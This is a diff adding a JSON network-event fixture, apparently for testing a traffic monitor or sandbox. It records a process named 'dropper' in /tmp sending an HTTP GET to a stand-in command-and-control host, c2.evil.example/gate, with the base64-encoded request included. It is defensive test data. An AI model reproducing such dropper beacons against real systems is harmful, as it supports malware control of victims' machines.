@@ -1,0 +1,18 @@
+{
+  "version": 1,
+  "type": "event",
+  "request_id": "6f1c2b0e-4c5a-4f0e-9a39-2b7f4d3c1a10",
+  "session_id": "tcp-0000000000000007",
+  "seq": 0,
+  "protocol": "http",
+  "transport": "tcp",
+  "tls": false,
+  "src": "10.0.0.5:49812",
+  "dst": "93.184.216.34:80",
+  "dport": 80,
+  "process": { "pid": 4242, "name": "dropper", "exe": "/tmp/dropper" },
+  "timestamp": "2026-10-16T17:05:00.123Z",
+  "payload": "R0VUIC9nYXRlP2lkPTQyIEhUVFAvMS4xDQpIb3N0OiBjMi5ldmlsLmV4YW1wbGUNCg0K",
+  "meta": { "method": "GET", "path": "/gate?id=42", "host": "c2.evil.example", "headers": { "host": "c2.evil.example" } },
+  "expects_reply": true
+}
